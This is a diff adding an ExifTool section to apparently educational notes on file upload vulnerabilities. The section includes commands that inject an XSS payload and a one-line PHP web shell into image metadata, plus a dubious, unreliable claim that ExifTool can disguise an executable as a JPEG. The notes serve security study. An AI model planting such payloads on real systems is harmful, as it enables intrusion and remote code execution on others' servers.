@@ -613,4 +613,36 @@ Many file upload vulnerabilities may lead to Denial of Service (DOS) attack on t
   - If the server does not properly validate file paths, the attacker might overwrite critical files or write files in unauthorized directories.
   - This can cause system instability or crashes.
 
+### exiftool 
 
+#### What is ExifTool?
+`ExifTool` is a command-line utility and library for reading, writing, and editing metadata in files, especially in images, videos, and documents. It supports many formats including `JPEG`, `PNG`, `PDF`, and `MP4`. 
+
+### How is this useful in file upload attacks? 
+ExifTool is sueful for file upload attacks because it allows you to `manipulate image metadata`, which some web apps extract and use unsafely. Here's how attackers use it: 
+* **XSS Injection in Metadata**
+  * If an app displays `metadata` (like `Comment` or `Description`) without sanitization, you can inject Javascript:
+    ```bash
+      exiftool -Comment='"><script>alert(1)</script>' image.jpg
+    ```
+  * When uploaded, if the app displays the `Comment` in an unsantizied <img> tag, it triggers the XSS.
+* **Web Shell in Metadata**
+  * Some applications `parse metadata` and log it without sanitization.
+  * Injecting `PHP or shell payloads` into metadata can be dangerous if the app executes metadata in any way
+    ```bash
+      exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
+    ```
+  * If the app stores logs or executes metadata, this can lead to `Remote Code Execution`
+* **Malicious File Extension Spoofing**
+  * ExifTool can `modify file extensions` inside metadata, tricking some security filters
+  * Example: Change metadata to make an executable look like an image:
+    ```bash
+      exiftool -FileType=JPEG -MIMEType=image/jpeg malicious.exe
+    ```
+
+### How do I know the current metadata of an image? 
+You can check the existing metadata of an image using ExifTool with the following command: 
+
+```bash
+exiftool image.jpg
+```
